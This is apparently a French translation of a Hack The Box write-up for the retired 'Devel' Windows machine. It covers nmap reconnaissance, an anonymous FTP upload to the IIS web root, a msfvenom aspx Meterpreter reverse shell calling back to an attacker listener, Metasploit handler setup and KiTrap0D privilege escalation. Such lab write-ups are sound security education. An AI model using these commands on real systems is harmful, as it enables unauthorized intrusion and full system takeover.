---
title: Restez calme et pirater la boîte - Devel
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-08-08T09:08:53.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-devel
coverImage: https://www.freecodecamp.org/news/content/images/2019/08/Sunrises_and_sunsets_Synthwave_Sun_562744_1920x1080.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: Restez calme et pirater la boîte - Devel
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note**. _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.37.03.png)

Devel est décrit comme une boîte relativement simple qui démontre les risques de sécurité associés à certaines configurations de programmes par défaut. C'est une machine de niveau débutant qui peut être complétée en utilisant des exploits disponibles publiquement.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)
* [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

## **Étape 1 - Scanning du réseau**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir le plus d'informations possible.

J'utiliserai **Nmap** (Network Mapper), qui est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.46.08.png)

J'utilise la commande suivante pour obtenir une idée de base de ce que nous scannons

```bash
nmap -sV -O -F --version-light 10.10.10.5
```

**-sV:** Sonde les ports ouverts pour déterminer les informations de service/version

**-O:** Active la détection du système d'exploitation

**-F:** Mode rapide - Scanne moins de ports que le scan par défaut

**--version-light:** Limite aux sondes les plus probables (intensité 2)

**10.10.10.5:** Adresse IP de la boîte Devel

Vous pouvez également utiliser **Zenmap**, qui est l'interface graphique officielle du scanner de sécurité Nmap. C'est une application multiplateforme, gratuite et open source qui vise à rendre Nmap facile à utiliser pour les débutants tout en fournissant des fonctionnalités avancées pour les utilisateurs expérimentés de Nmap.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.49.40.png)

J'utilise un ensemble différent de commandes pour effectuer un scan intensif

```bash
nmap -A -v 10.10.10.5
```

**-A:** Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v:** Augmente le niveau de verbosité

**10.10.10.5:** Adresse IP de la boîte Devel

Si vous trouvez les résultats un peu trop écrasants, vous pouvez passer à l'onglet **Ports/Hôtes** pour obtenir uniquement les ports ouverts.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-20.49.58.png)

Nous pouvons voir qu'il y a 2 ports ouverts:

**Port** 21. File Transfer Protocol (FTP) control (command). Ici, c'est un FTP Microsoft

**Port** 80. Hypertext Transfer Protocol (HTTP). Ici, c'est un serveur IIS

Le vecteur d'attaque initial le plus probable semble être le **FTP** dans ce cas

## **Étape 2 -** Le FTP vulnérable

Nous ouvrons **Firefox** et visitons le site web à l'adresse **http://10.10.10.5**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.10.35.png)

Lors de la phase de reconnaissance, nous avons trouvé 2 fichiers sous le FTP Microsoft. Voyons si nous pouvons y accéder depuis le navigateur.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.13.04.png)

Je peux accéder au fichier image **welcome.png** en visitant

```url
http://10.10.10.5/welcome.png
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.14.57.png)

Je peux également accéder à la page **iisstart.htm**

```url
http://10.10.10.5/iisstart.htm
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.17.18.png)

Nous savons maintenant deux choses:

* Le FTP est utilisé comme un répertoire de fichiers pour le serveur web - découvert lorsque nous avons accédé aux fichiers depuis la phase de reconnaissance.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.22.01.png)

* Le FTP permet la connexion anonyme - découvert lorsque nous avons effectué le scan intensif.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.20.56.png)

Voyons si nous pouvons créer un fichier et l'ajouter au FTP

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.26.07.png)

Je crée un fichier en utilisant cette commande et j'envoie le résultat dans un fichier appelé **htb.html**

```bash
echo HackTheBox > htb.html
```

Je vérifie ensuite avec **ls** si le fichier a été créé et quel est le contenu du fichier avec cette commande

```bash
cat htb.html
```

Connectons-nous maintenant au FTP pour ajouter notre fichier de test

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.29.30.png)

Pour me connecter au FTP, j'utilise cette commande

```bash
ftp 10.10.10.5
```

Je tape **anonymous** comme nom d'utilisateur et je presse simplement entrée pour le mot de passe, car il permet la connexion anonyme.

Je suis maintenant connecté au FTP.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.32.59.png)

J'ajoute le fichier sur le FTP avec cette commande

```bash
put htb.html
```

Le fichier a été envoyé avec succès. Vérifions si nous pouvons y accéder depuis Firefox. Je visite la page et nous pouvons voir la sortie **HackTheBox** sur la page web.

```url
http://10.10.10.5/htb.html
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.35.06.png)

Maintenant que nous savons que nous pouvons envoyer des fichiers, créons un exploit !

## **Étape 3 -** Utilisation de MSFvenom pour créer un exploit

Nous allons utiliser MSFvenom, qui est un générateur de charge utile. Vous pouvez en savoir plus à ce sujet [ici](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.49.14.png)

Mais d'abord, vérifions sur **[Metasploit Framework](https://www.metasploit.com/)** quelle charge utile nous devons utiliser pour créer notre exploit.

Nous savons que nous devons créer un **reverse shell**, qui est un type de shell dans lequel la machine cible communique avec la machine attaquante. La machine attaquante a un port d'écoute sur lequel elle reçoit la connexion, ce qui permet d'exécuter du code ou des commandes.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.53.40.png)
_[https://resources.infosecinstitute.com/icmp-reverse-shell/](https://resources.infosecinstitute.com/icmp-reverse-shell/)_

Le reverse TCP shell doit être pour Windows et nous utiliserons **Meterpreter**.

D'après le site web d'Offensive Security, nous obtenons cette définition pour Meterpreter

> Meterpreter est une charge utile avancée, dynamiquement extensible qui utilise des injecteurs de DLL _in-memory_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket de l'injecteur et fournit une API Ruby complète côté client. Il dispose de l'historique des commandes, de la complétion par tabulation, des canaux, et plus encore.

Vous pouvez en savoir plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.57.28.png)

Je lance **Metasploit** et je recherche les charges utiles reverse TCP. J'utilise la commande suivante

```bash
search windows/meterpreter/reverse_tcp
```

Nous trouvons une charge utile intéressante, numéro 2, qui est un **Reverse TCP Stager**. Cette charge utile injecte le serveur meterpreter DLL via la charge utile Reflective Dll Injection et se connecte à l'attaquant.

```bash
payload/windows/meterpreter/reverse_tcp
```

Maintenant, retournons à **msfvenom** pour créer notre exploit. Et plus spécifiquement un **aspx** reverse shell. Cette information a été collectée lors de la phase de reconnaissance.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.09.43.png)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.13.15.png)

J'utilise la commande suivante

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o devel.aspx LHOST=10.10.14.15 LPORT=4444
```

**-p:** Charge utile à utiliser

**-f:** Format de sortie

**-o:** Enregistrer la charge utile dans un fichier

**LHOST:** Hôte local

**LPORT:** Port local

Je vérifie ensuite avec **ls** si le fichier a été créé. Il est temps de l'envoyer au FTP

Reconnectons-nous au FTP et envoyons notre petit cadeau !

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.22.14.png)

Je me connecte au FTP, entre **anonymous** comme nom d'utilisateur, saute le mot de passe en appuyant sur entrée. J'envoie ensuite le fichier avec la commande suivante

```bash
put devel.aspx
```

Vérifions si le fichier a été correctement envoyé. Retour à **Firefox**, je navigue vers le serveur FTP avec la commande suivante

```url
ftp://10.10.10.5
```

Nous pouvons voir que notre petit cadeau est ici !

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.37.40.png)

Voici l'exploit, si vous êtes curieux de savoir à quoi il ressemble

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.37.55.png)

## **Étape 4 -** Configuration d'un écouteur avec Metasploit

De retour sur Metasploit où j'utilise la commande suivante pour définir le gestionnaire de charge utile

```bash
use exploit/multi/handler
```

Je vérifie pour voir quelles options sont disponibles

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.29.png)

Nous configurons d'abord la charge utile

```bash
set payload windows/meterpreter/reverse_tcp
```

Ensuite le LHOST

```bash
set lhost 10.10.14.15
```

Et enfin le LPORT

```bash
set lport 4444
```

Si nous vérifions les options maintenant, nous devrions voir que tout est configuré

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.42.png)

Lançons l'exploit.

Après l'apparition de ce message

```bash
Started reverse TCP handler on 10.10.14.15:4444
```

retournez au navigateur et accédez à la page où le script malveillant est hébergé

```url
http://10.10.10.5/devel.aspx
```

Vous devriez alors voir une session Meterpreter créée

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-23.54.51.png)

Maintenant que j'ai une session, j'essaie de chercher le premier flag, user.txt en utilisant la commande suivante sur meterpreter

```bash
search -f user.txt
```

Aucun fichier ne correspond à ma recherche. J'essaie avec .* pour voir d'autres fichiers, mais rien d'utile

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.01.41.png)

Je crée ensuite un shell avec la commande suivante

```bash
shell
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.08.21.png)

J'utilise la commande suivante pour obtenir les informations système

```bash
systeminfo
```

Nous pouvons voir que le propriétaire enregistré s'appelle **babis**. Cela pourrait être une information importante lorsque nous chercherons le flag utilisateur. Nous pouvons également voir que la machine n'a aucun correctif.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.08.44-1.png)

Je commence à naviguer dans les dossiers. J'utilise **dir** pour lister tous les fichiers/dossiers et **cd** pour changer de répertoire. J'essaie ma chance sur les dossiers **babis** et **Administrator**, mais les deux m'ont donné un accès refusé.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.06.20.png)

Nous devons escalader les privilèges ! Sachant que lorsque nous avons vérifié les informations système, aucun correctif n'a été trouvé, nous pouvons essayer de trouver des exploits applicables à cette machine.

## Étape 5 - Réalisation de l'escalade de privilèges

Je mets la session en arrière-plan avec cette commande

```bash
background
```

J'utilise ensuite la commande suivante

```bash
use post/multi/recon/local_exploit_suggester
```

Ce module suggère des exploits locaux Meterpreter qui peuvent être utilisés. Les exploits sont suggérés en fonction de l'architecture et de la plateforme que l'utilisateur a une session ouverte ainsi que des exploits disponibles dans Meterpreter

Je vérifie les options et je définis la session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.03.png)

Il est important de noter que tous les exploits locaux ne seront pas exécutés. Les exploits sont choisis en fonction de ces conditions : type de session, plateforme, architecture et options par défaut requises

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.15.png)

En descendant la liste

```bash
exploit/windows/local/bypassuac_eventvwr
```

échoue en raison de l'utilisateur IIS ne faisant pas partie du groupe des administrateurs, ce qui est le cas par défaut et à quoi on peut s'attendre.

J'utilise l'exploit suivant dans la liste, qui est

```bash
use exploit/windows/local/ms10_015_kitrap0d
```

Ce module créera une nouvelle session avec des privilèges SYSTEM via l'exploit KiTrap0D de Tavis Ormandy. Si la session utilisée est déjà élevée, l'exploit ne s'exécutera pas. Le module repose sur kitrap0d.x86.dll et n'est pas pris en charge sur les éditions x64 de Windows.

Lorsque nous avons exécuté **sysinfo** dans la session Meterpreter, il a révélé que la cible était une architecture x86

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.46.png)

Je vérifie les options et je définis la session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.41.59-1.png)

J'exécute l'exploit.

L'exploit a réussi, mais la session n'a pas pu être créée. Cela est dû à la première ligne de l'exploit qui tente de configurer un gestionnaire reverse sur l'eth0 par défaut et le port par défaut, et non l'interface VPN pour les labs HTB.

```bash
Started reverse TCP handler on 10.0.2.15:4444
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.42.58.png)

Je vérifie les options et je définis LHOST et LPORT

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.43.17.png)

Je vérifie ensuite toutes les sessions actives avec la commande suivante, au cas où ma session serait morte

```bash
sessions -l
```

Je peux voir ma session

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.43.57.png)

Maintenant que nous avons une session meterpreter, commençons à naviguer dans le dossier et trouvons les flags !

## **Étape 6 - Recherche du flag user.txt**

Vérifions d'abord où nous sommes avec la commande suivante

```bash
pwd
```

qui signifie **print work directory**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.16.png)

Je remonte à **C:\** et **ls** tous les fichiers/dossiers. Je sais déjà où chercher depuis ma précédente tentative dans **Étape 4 - Configuration d'un écouteur avec Metasploit**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.29.png)

Je retourne au répertoire **Users**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.44.57.png)

Puis je me déplace vers le répertoire **babis**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.45.13.png)

De là, je vais dans le répertoire **Desktop**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.45.34.png)

Nous avons trouvé le fichier **user.txt.txt** ! Pour lire le contenu du fichier, j'utilise la commande

```bash
cat user.txt.txt
```

Maintenant que nous avons le flag utilisateur, trouvons le flag root !

## **Étape 7 - Recherche du flag root.txt**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.46.02.png)

Retour à **C:\** pour naviguer vers le dossier **Administrator** puis le dossier **Desktop**. J'utilise **ls** pour lister tous les fichiers sous le dossier **Desktop**

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-07-at-00.46.12.png)

Nous trouvons le fichier **root.txt.txt** !

Pour lire le contenu du fichier, j'utilise la commande

```bash
cat root.txt.txt
```

Félicitations ! Vous avez trouvé les deux flags !

---

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

---

**Autres articles Hack The Box**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Sunrises_and_sunsets_Synthwave_Sun_562744_1920x1080-1.jpg)